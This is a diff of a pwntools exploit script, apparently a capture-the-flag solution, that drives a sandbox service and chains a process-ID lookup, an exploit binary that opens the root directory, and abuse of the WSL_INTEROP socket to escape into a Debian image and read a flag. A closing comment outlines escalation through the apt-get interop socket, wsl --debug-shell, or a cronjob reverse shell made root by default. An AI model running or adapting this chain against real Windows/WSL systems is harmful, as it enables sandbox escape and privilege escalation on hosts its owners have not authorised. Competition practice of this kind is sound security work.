@@ -6,9 +6,7 @@ os.system('make')
 idle_elf = open('./idle', 'rb').read()
 init_shell = open('./shell', 'rb').read()
 
-#p = remote('localhost', 1024)
-p = listen(1234)
-_ = p.wait_for_connection()
+p = remote('10.69.0.1', 20000)
 
 def sandbox(elf):
     p.sendlineafter(b'>', b'1')
@@ -30,6 +28,7 @@ for i in range(256):
 
 clone(0, None)
 p.recvuntil(b' ')
+#context.log_level = 'debug'
 pause()
 p.sendline(b'/bin/busybox umount /')
 p.sendline(b'exec 2>&1')
@@ -39,9 +38,33 @@ p.sendline(b'exec 2>&1')
 # For ./run.sh inside socat the fd becomes 6
 p.sendline(b'/tmp/working/bin/start_fserv 4')
 p.sendline(b'umount /proc')
-p.sendline(b'/tmp/working/bin/exp 4') # TODO: make sure 4 is the correct PID
-p.sendline(b'umount /tmp/*')
-p.sendline(b'umount /tmp/working')
-p.sendline(b'umount /tmp')
+
+p.sendline(b'echo "HI: " && (ps | grep /tmp/fserv)')
+p.recvuntil(b'HI: ')
+p.recvline()
+fserv_pid = int(p.recvline().strip().split(b' ')[0])
+log.info(f'fserv pid: {fserv_pid}')
+p.sendline(bytes(f'cat /proc/{fserv_pid}/status | grep PPid', 'utf8'))
+p.recvuntil(b'PPid:\t')
+fserv_parent = int(p.recvline().strip())
+log.info(f'fserv ppid: {fserv_parent}')
+
+fserv_guess = fserv_parent - 2
+p.sendline(bytes(f'/tmp/working/bin/exp {fserv_guess}', 'utf8')) # TODO: make sure this guess is correct
+
+p.recvuntil(b'Opened root dir on fd ')
+rootfd = int(p.recvuntil(b'.', drop=True))
+
+p.sendline(bytes(f'WSL_INTEROP=/proc/self/fd/{rootfd}/run/WSL/1_interop /tmp/working/bin/debian', 'utf8'))
+
+p.sendline(b'cat /flag1.txt')
+
+# NOTE: the rest of the exploit chain is relatively trivial. You just need to
+# hook onto the WSL_interop socket that is connected to the apt-get job (since
+# that runs at high mandatory level). To get the other flag, just run
+# `wsl --debug-shell` and pivot back to this debian image, or you can create a
+# cronjob that sets up a reverse shell and then run `debian config --default-user root`
+# which would also get the job done.
+
 p.interactive()
 
